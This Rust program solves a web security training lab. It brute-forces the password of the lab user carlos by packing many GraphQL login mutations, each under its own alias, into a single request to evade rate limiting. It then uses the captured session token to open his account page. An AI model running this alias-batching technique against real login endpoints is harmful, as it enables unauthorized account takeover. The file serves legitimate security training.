/**********************************************************
*
* Lab: Bypassing GraphQL brute force protections
*
* Hack Steps:
*      1. Read password list
*      2. Try all passwords for carlos in the same query
*      3. Extract carlos token from the success attempt
*      4. Fetch carlos profile
*
***********************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    fs,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0aec007904a1645d80d7d52b00080050.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Reading password list.. ");
    flush_terminal();

    let password_list = read_password_list("../passwords.txt"); // Make sure the file exist in your root directory or change its path accordingly

    println!("{}", "OK".green());
    print!("⦗2⦘ Trying all passwords for carlos in the same query.. ");
    flush_terminal();

    let query = try_multiple_passwords_to_login(&password_list);

    println!("{}", "OK".green());
    print!("⦗3⦘ Extracting carlos token from the success attempt.. ");
    flush_terminal();

    let query_result = query.text().unwrap();
    let carlos_token =
        capture_pattern_from_text(r###""token": "(\w*)",\s*"success": true"###, &query_result);

    println!("{} => {}", "OK".green(), carlos_token.yellow());
    print!("⦗4⦘ Fetching carlos profile.. ");
    flush_terminal();

    fetch_carlos_profile(&carlos_token);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn read_password_list(file_path: &str) -> Vec<String> {
    let passwords_big_string = fs::read_to_string(file_path)
        .expect(&format!("Failed to read the file: {}", file_path.red()));
    passwords_big_string.lines().map(|p| p.to_owned()).collect()
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn try_multiple_passwords_to_login(password_list: &Vec<String>) -> Response {
    let attempts = build_attempts(&password_list);
    let mutation = format!(r###"mutation login {{ {attempts} }}"###);
    let body_json = format!(r###"{{ "query": "{mutation}", "operationName": "login" }}"###);

    WEB_CLIENT
        .post(format!("{LAB_URL}/graphql/v1"))
        .header("Content-Type", "application/json")
        .body(body_json)
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to query hte user".red()))
}

fn build_attempts(password_list: &Vec<String>) -> String {
    let mut attempts = String::new();

    for (index, password) in password_list.iter().enumerate() {
        let to_push = format!(
            r###"attempt{}:login(input: {{ username: \"carlos\", password: \"{password}\" }}) {{
                    token
                    success
                }}"###,
            index + 1
        );
        attempts.push_str(&to_push);
    }
    return attempts;
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn fetch_carlos_profile(session: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}/my-account"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to delete carlos from the admin panel".red()
        ))
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
